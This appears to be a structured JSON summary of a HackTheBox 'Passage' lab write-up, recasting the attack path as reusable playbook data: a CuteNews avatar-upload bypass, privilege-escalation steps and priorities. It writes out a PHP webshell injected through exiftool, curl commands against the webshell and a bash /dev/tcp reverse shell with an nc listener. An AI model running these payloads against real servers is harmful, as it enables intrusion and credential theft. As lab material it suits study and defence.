{
  "writeup_id": "Htb_Passage",
  "scenario_fingerprint": {
    "scenario_name": "cutenews_avatar_upload_rce",
    "primary_services": [
      "http",
      "ssh"
    ],
    "port_signature": "22+80",
    "service_combination": "ssh+apache",
    "os_family": "linux",
    "environment_type": "web_application",
    "entry_vector": "file_upload_bypass",
    "privilege_path": "webshell_to_user_pivot",
    "attack_complexity": "medium",
    "estimated_time": "60-90 minutes",
    "scenario_confidence": 0.88,
    "distinguishing_factors": [
      "cutenews_cms_version_2.1.2",
      "avatar_upload_functionality",
      "file_extension_validation_bypass",
      "gif_header_bypass_technique"
    ],
    "environmental_clues": [
      "cutenews_rss_endpoint",
      "user_registration_enabled",
      "fail2ban_implementation_mentioned",
      "ubuntu_16.04_fingerprint"
    ],
    "similar_scenarios": [
      "cms_file_upload_rce",
      "avatar_upload_bypass"
    ],
    "unique_aspects": [
      "cutenews_specific_vulnerability",
      "profile_avatar_upload_vector",
      "authenticated_file_upload_required"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "CuteNews Avatar Upload RCE",
        "success_reason": "Client-side validation bypass allowed PHP webshell upload via avatar functionality",
        "prerequisite_indicators": [
          "cutenews_version_2.1.2_vulnerable",
          "avatar_upload_functionality_available",
          "user_registration_enabled",
          "php_execution_in_uploads_directory"
        ],
        "recognition_patterns": [
          "CuteNews version disclosure in login page",
          "avatar upload form in personal settings",
          "client-side filename validation only",
          "uploads directory accessible via web"
        ],
        "failure_modes": [
          "server_side_file_validation",
          "php_execution_disabled_uploads",
          "file_extension_whitelist_enforced",
          "user_registration_disabled"
        ],
        "environmental_factors": [
          "default_cutenews_configuration",
          "apache_php_execution_enabled",
          "insufficient_upload_restrictions",
          "predictable_upload_path_structure"
        ],
        "success_probability": 0.92,
        "typical_timeframe": "10-20 minutes"
      },
      {
        "technique": "Exiftool Comment Injection",
        "success_reason": "Image metadata processed as PHP code when file extension changed",
        "prerequisite_indicators": [
          "image_upload_accepts_metadata",
          "php_processes_image_files",
          "exif_data_not_sanitized",
          "file_extension_determines_execution"
        ],
        "recognition_patterns": [
          "image upload functionality present",
          "metadata preserved after upload",
          "server processes files by extension",
          "no content-type validation"
        ],
        "failure_modes": [
          "metadata_stripped_on_upload",
          "content_type_validation_enforced",
          "image_reprocessing_removes_exif",
          "php_execution_context_restricted"
        ],
        "environmental_factors": [
          "default_php_configuration",
          "apache_mod_php_enabled",
          "no_image_processing_sanitization",
          "permissive_file_handling"
        ],
        "success_probability": 0.85,
        "typical_timeframe": "5-10 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "CuteNews version 2.1.2",
        "discovery_method": "Version disclosure on login page",
        "why_critical": "Known vulnerable version with multiple RCE exploits available",
        "how_to_recognize": [
          "version string in login interface",
          "RSS feed path reveals application",
          "searchsploit shows multiple exploits"
        ],
        "follow_up_actions": [
          "register_user_account",
          "access_avatar_upload_functionality",
          "prepare_webshell_payload"
        ]
      },
      {
        "discovery": "Client-side only file validation",
        "discovery_method": "JavaScript validation without server-side checks",
        "why_critical": "Allows bypass of security controls via proxy interception",
        "how_to_recognize": [
          "immediate error without server request",
          "javascript validation in browser",
          "burp shows no server communication"
        ],
        "follow_up_actions": [
          "intercept_upload_request",
          "modify_filename_extension",
          "test_server_side_validation"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "www-data",
        "escalation_method": "CuteNews_data_file_analysis",
        "why_possible": "CuteNews stores user data in accessible files with password hashes",
        "recognition_signs": [
          "cutenews_installation_present",
          "file_based_user_storage",
          "readable_data_directory",
          "base64_encoded_user_data"
        ],
        "exploitation_path": "Analyze CuteNews files → Extract password hashes → Crack hashes → SSH access"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found only ports 22 and 80 open on Linux host",
        "decision": "Focus on web application enumeration and avoid brute force",
        "reasoning": "Limited attack surface, and site mentions Fail2Ban implementation",
        "confidence": 0.9,
        "alternatives": [
          {
            "option": "ssh_enumeration",
            "when": "if web exploitation fails"
          },
          {
            "option": "version_specific_exploits",
            "when": "if service versions identified"
          }
        ],
        "success_indicators": [
          "web_application_identified",
          "version_information_found",
          "user_registration_available"
        ],
        "next_decision": "identify_web_application_vulnerabilities"
      },
      {
        "step": 2,
        "situation": "Discovered CuteNews 2.1.2 with user registration enabled",
        "decision": "Create account and exploit authenticated file upload vulnerability",
        "reasoning": "Known CVE for this version allows avatar upload bypass for RCE",
        "confidence": 0.95,
        "prerequisites": [
          "user_account_created",
          "access_to_profile_page"
        ],
        "success_indicators": [
          "avatar_upload_successful",
          "php_execution_confirmed"
        ],
        "failure_fallbacks": [
          "search_for_other_cutenews_exploits",
          "enumerate_other_functionality"
        ]
      },
      {
        "step": 3,
        "situation": "Successfully uploaded webshell via avatar bypass",
        "decision": "Establish reverse shell and enumerate file-based storage",
        "reasoning": "CuteNews uses file-based storage instead of database",
        "confidence": 0.85,
        "prerequisites": [
          "webshell_uploaded",
          "command_execution_confirmed"
        ],
        "success_indicators": [
          "reverse_shell_established",
          "file_storage_located"
        ],
        "failure_fallbacks": [
          "use_webshell_for_enumeration",
          "search_for_database_files"
        ]
      }
    ],
    "branching_logic": {
      "if_file_upload_succeeds": {
        "action": "establish_persistent_shell",
        "tools": [
          "reverse_shell_payload",
          "netcat_listener"
        ],
        "next_phase": "enumerate_file_storage_system"
      },
      "if_file_upload_fails": {
        "action": "try_alternative_cutenews_exploits",
        "alternatives": [
          "arbitrary_file_deletion",
          "other_upload_methods"
        ],
        "decision_criteria": "based_on_error_messages_and_restrictions"
      },
      "if_shell_obtained": {
        "action": "enumerate_cutenews_data_files",
        "purpose": "find_user_credentials_and_hashes",
        "tools": [
          "find_command",
          "grep",
          "file_analysis"
        ]
      }
    },
    "optimization_rules": [
      {
        "rule": "bypass_client_side_validation_with_proxy",
        "reasoning": "javascript_validation_not_security_control",
        "applicability": "file_upload_restrictions"
      },
      {
        "rule": "check_uploads_directory_for_artifacts",
        "reasoning": "may_contain_other_user_shells_or_data",
        "applicability": "after_successful_file_upload"
      },
      {
        "rule": "analyze_file_based_cms_storage_structure",
        "reasoning": "credentials_stored_in_files_not_database",
        "applicability": "cutenews_and_similar_file_based_systems"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "CuteNews Avatar Upload RCE",
        "mitre_id": "T1190",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "cutenews_cms_detected",
          "user_registration_enabled",
          "avatar_upload_functionality",
          "php_execution_enabled"
        ],
        "success_indicators": [
          "cutenews_version_2.1.2_or_lower",
          "profile_page_accessible",
          "uploads_directory_accessible",
          "gif_header_bypass_works"
        ],
        "incompatible_with": [
          "file_upload_disabled",
          "php_execution_disabled",
          "strict_file_validation",
          "uploads_directory_blocked"
        ],
        "confidence_boosters": [
          "rss_php_endpoint_exists",
          "cutenews_login_page_found",
          "version_disclosure_in_response",
          "default_cutenews_structure"
        ],
        "typical_success_rate": 0.92,
        "estimated_time": "10-20 minutes"
      },
      {
        "technique": "SSH Key Reuse",
        "mitre_id": "T1552.004",
        "required_services": [
          "ssh"
        ],
        "required_ports": [
          22
        ],
        "os_requirements": [
          "linux",
          "unix"
        ],
        "environmental_prerequisites": [
          "ssh_service_accessible",
          "user_home_directories_accessible",
          "ssh_keys_present"
        ],
        "success_indicators": [
          "dot_ssh_directory_found",
          "private_key_readable",
          "key_works_for_multiple_users",
          "authorized_keys_misconfigured"
        ],
        "incompatible_with": [
          "ssh_disabled",
          "key_based_auth_disabled",
          "proper_key_permissions",
          "unique_keys_per_user"
        ],
        "confidence_boosters": [
          "shared_user_environment",
          "default_ssh_configuration",
          "family_or_team_server",
          "legacy_key_management"
        ],
        "typical_success_rate": 0.73,
        "estimated_time": "5-10 minutes"
      },
      {
        "technique": "USBCreator Sudo Bypass",
        "mitre_id": "T1548.003",
        "required_services": [],
        "required_ports": [],
        "os_requirements": [
          "ubuntu"
        ],
        "environmental_prerequisites": [
          "ubuntu_system_detected",
          "usbcreator_installed",
          "user_in_sudo_group",
          "d_bus_accessible"
        ],
        "success_indicators": [
          "usbcreator_d_bus_service_running",
          "user_has_sudo_privileges",
          "file_copy_via_dbus_works",
          "ubuntu_16_04_or_similar"
        ],
        "incompatible_with": [
          "usbcreator_not_installed",
          "d_bus_restrictions",
          "user_not_in_sudo_group",
          "patched_usbcreator"
        ],
        "confidence_boosters": [
          "desktop_ubuntu_environment",
          "default_ubuntu_packages",
          "unpatched_system",
          "standard_user_groups"
        ],
        "typical_success_rate": 0.85,
        "estimated_time": "15-25 minutes"
      }
    ],
    "environmental_detectors": {
      "cutenews_cms": {
        "port_indicators": [
          80,
          443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "path_indicators": [
          "/CuteNews/",
          "/rss.php",
          "/index.php?mod=main"
        ],
        "banner_indicators": [
          "CuteNews",
          "Powered by CuteNews"
        ],
        "confidence_threshold": 0.9
      },
      "ubuntu_system": {
        "port_indicators": [
          22
        ],
        "service_indicators": [
          "ssh"
        ],
        "banner_indicators": [
          "Ubuntu",
          "OpenSSH 7.2p2 Ubuntu"
        ],
        "version_indicators": [
          "Apache/2.4.18 (Ubuntu)"
        ],
        "confidence_threshold": 0.85
      },
      "web_application": {
        "port_indicators": [
          80,
          443,
          8080,
          8443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "technology_indicators": [
          "apache",
          "nginx",
          "iis"
        ],
        "confidence_threshold": 0.9
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "cutenews_avatar_upload_rce",
          "when": "cutenews_detected_and_registration_enabled",
          "reason": "high_success_rate_leads_to_immediate_shell"
        },
        {
          "attack": "ssh_key_enumeration",
          "when": "ssh_accessible_and_user_shell_obtained",
          "reason": "common_misconfiguration_in_multi_user_systems"
        }
      ],
      "medium_priority": [
        {
          "attack": "usbcreator_privilege_escalation",
          "when": "ubuntu_detected_and_user_access_obtained",
          "reason": "specific_to_ubuntu_but_reliable_when_applicable"
        },
        {
          "attack": "fail2ban_aware_enumeration",
          "when": "fail2ban_detected_or_mentioned",
          "reason": "requires_careful_approach_to_avoid_ip_blocking"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "CuteNews Avatar Upload RCE",
        "mitre_id": "T1190",
        "category": "initial_access",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "exiftool",
            "command_template": "exiftool -Comment='<?php echo \"<pre>\"; system($_GET[\"cmd\"]); echo \"</pre>\"; ?>' {image_file}",
            "actual_command": "exiftool -Comment='<?php echo \"<pre>\"; system($_GET[\"cmd\"]); echo \"</pre>\"; ?>' avatar.png",
            "output_pattern": "1 image files updated",
            "effectiveness_rating": 5,
            "reliability": 0.95
          },
          {
            "name": "burp_suite",
            "command_template": "Intercept upload request and modify filename extension",
            "actual_command": "Change avatar.png to avatar.php in POST request",
            "success_factors": [
              "client_side_validation_only",
              "server_processes_php_in_uploads"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "cutenews_2.1.2_accessible",
          "user_registration_enabled",
          "avatar_upload_functionality",
          "uploads_directory_web_accessible"
        ],
        "success_indicators": [
          "avatar_upload_successful",
          "php_code_execution_confirmed",
          "command_injection_working"
        ],
        "common_failures": [
          "server_side_file_validation",
          "uploads_directory_not_executable",
          "php_execution_disabled"
        ],
        "follow_up_techniques": [
          "reverse_shell_execution",
          "local_enumeration",
          "privilege_escalation"
        ],
        "time_investment": "10-20 minutes",
        "skill_level": "beginner"
      },
      {
        "name": "CuteNews File-Based Storage Analysis",
        "mitre_id": "T1005",
        "category": "collection",
        "phase": "post_exploitation",
        "tools_used": [
          {
            "name": "manual_analysis",
            "command_template": "find /var/www/html/CuteNews -name '*.db' -o -name 'users*'",
            "actual_command": "ls -la /var/www/html/CuteNews/cdata/users/",
            "output_pattern": "user data files",
            "effectiveness_rating": 4,
            "reliability": 0.9
          }
        ],
        "prerequisites": [
          "web_shell_access",
          "cutenews_installation_identified",
          "file_system_access"
        ],
        "success_indicators": [
          "user_data_files_located",
          "password_hashes_extracted",
          "user_enumeration_complete"
        ],
        "common_failures": [
          "encrypted_user_data",
          "insufficient_file_permissions",
          "data_stored_externally"
        ],
        "follow_up_techniques": [
          "hash_cracking",
          "credential_reuse_testing",
          "lateral_movement"
        ],
        "time_investment": "15-30 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Reverse Shell via Web Shell",
        "mitre_id": "T1059.004",
        "category": "execution",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "bash_reverse_shell",
            "command_template": "bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1'",
            "actual_command": "bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'",
            "output_pattern": "reverse shell connection",
            "effectiveness_rating": 5,
            "reliability": 0.85
          },
          {
            "name": "netcat_listener",
            "command_template": "nc -lnvp {port}",
            "actual_command": "nc -lnvp 443",
            "success_factors": [
              "network_connectivity",
              "bash_available",
              "outbound_connections_allowed"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "web_shell_established",
          "command_execution_confirmed",
          "network_connectivity_to_attacker"
        ],
        "success_indicators": [
          "reverse_shell_connection_established",
          "interactive_shell_obtained",
          "command_execution_confirmed"
        ],
        "common_failures": [
          "firewall_blocking_outbound",
          "bash_not_available",
          "network_connectivity_issues"
        ],
        "follow_up_techniques": [
          "shell_stabilization",
          "local_enumeration",
          "privilege_escalation"
        ],
        "time_investment": "2-5 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "exiftool",
        "use_case": "metadata_injection_for_webshell",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "image_based_upload_bypasses"
        ],
        "alternatives": [
          "manual_hex_editing",
          "steganography_tools"
        ],
        "best_practices": [
          "use_comment_field_for_payload",
          "test_payload_syntax_before_injection",
          "keep_original_image_format_intact"
        ]
      },
      {
        "tool": "burp_suite",
        "use_case": "request_interception_and_modification",
        "effectiveness_rating": 5,
        "reliability": 0.98,
        "learning_curve": "medium",
        "essential_for": [
          "bypassing_client_side_validation"
        ],
        "alternatives": [
          "owasp_zap",
          "manual_curl_requests"
        ],
        "best_practices": [
          "intercept_at_upload_request",
          "modify_filename_extension_only",
          "verify_content_type_if_validated"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "cutenews_avatar_rce_to_shell",
        "steps": [
          {
            "step": 1,
            "command": "exiftool -Comment='<?php echo \"<pre>\"; system($_GET[\"cmd\"]); echo \"</pre>\"; ?>' avatar.png",
            "purpose": "Inject PHP webshell into image metadata",
            "expected_output": "1 image files updated"
          },
          {
            "step": 2,
            "command": "Upload via Burp, change filename from .png to .php",
            "purpose": "Bypass client-side validation and upload PHP file",
            "expected_output": "Avatar upload successful"
          },
          {
            "step": 3,
            "command": "curl 'http://passage.htb/CuteNews/uploads/avatar_username_avatar.php?cmd=id'",
            "purpose": "Test command execution via uploaded webshell",
            "expected_output": "uid=33(www-data) gid=33(www-data)"
          },
          {
            "step": 4,
            "command": "nc -lnvp 443",
            "purpose": "Set up reverse shell listener",
            "expected_output": "Listening on port 443"
          },
          {
            "step": 5,
            "command": "curl 'http://passage.htb/CuteNews/uploads/avatar_username_avatar.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.9%2F443%200%3E%261%27'",
            "purpose": "Execute reverse shell command",
            "expected_output": "Reverse shell connection established"
          }
        ],
        "success_rate": 0.9,
        "typical_duration": "10-15 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Passage",
      "difficulty": "Medium",
      "os": "Ubuntu 16.04",
      "platform": "HackTheBox",
      "release_date": "2020-09-05",
      "author": "ChefByzen",
      "estimated_time": "2-3 hours"
    },
    "intelligence_metadata": {
      "attack_complexity": "medium",
      "skill_level_required": "intermediate",
      "primary_attack_vectors": [
        "web_application",
        "file_analysis",
        "ssh_key_reuse"
      ],
      "key_vulnerabilities": [
        "cutenews_webshell_upload",
        "password_hash_extraction",
        "usbcreator_sudo_bypass"
      ],
      "environment_type": "web_server_with_cms",
      "real_world_relevance": "high",
      "learning_value": [
        "cms_exploitation",
        "file_system_analysis",
        "sudo_privilege_escalation"
      ],
      "prerequisite_knowledge": [
        "web_application_testing",
        "hash_cracking",
        "linux_file_systems"
      ]
    },
    "categorization": {
      "primary_category": "web_application",
      "subcategories": [
        "cms_exploitation",
        "privilege_escalation",
        "credential_reuse"
      ],
      "attack_types": [
        "initial_access",
        "credential_access",
        "privilege_escalation"
      ],
      "defensive_lessons": [
        "secure_file_uploads",
        "proper_user_separation",
        "sudo_configuration_hardening"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Nineveh",
        "Blocky",
        "Previse"
      ],
      "similarity_reasons": [
        "cms_exploitation",
        "file_analysis_required",
        "credential_extraction"
      ],
      "unique_aspects": [
        "cutenews_platform",
        "usbcreator_exploit",
        "ssh_key_sharing"
      ],
      "difficulty_factors": [
        "source_code_analysis",
        "file_format_understanding",
        "sudo_bypass_technique"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-05T03:51:57.458590",
    "original_file": "0xdf_writeups/Htb Passage.md",
    "content_length": 41244,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 0.9166666666666667,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 0.6666666666666666,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}